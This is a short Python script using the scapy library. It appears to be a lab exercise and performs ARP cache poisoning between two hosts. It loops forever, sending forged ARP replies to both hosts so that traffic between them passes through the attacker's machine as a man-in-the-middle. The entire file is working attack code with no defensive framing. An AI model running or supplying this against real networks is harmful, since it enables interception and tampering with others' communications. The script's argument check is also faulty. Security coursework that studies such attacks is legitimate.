
from scapy.all import *
import sys
import time

if len(sys.argv) > 3:
	sys.exit('Usage: sudo python3 task2-mitm.py [VM A] [VM B]')

SELF_MAC='08:00:27:bc:f5:3d'

def poison(spoofIP, victimIP):
	E=Ether(src=SELF_MAC)
	A=ARP(op=2, psrc=spoofIP, pdst=victimIP, hwsrc=SELF_MAC)
	pkt=E/A
	pkt.show()
	sendp(pkt)

while(1):
	poison(sys.argv[1], sys.argv[2])
	poison(sys.argv[2], sys.argv[1])
	time.sleep(10)
	
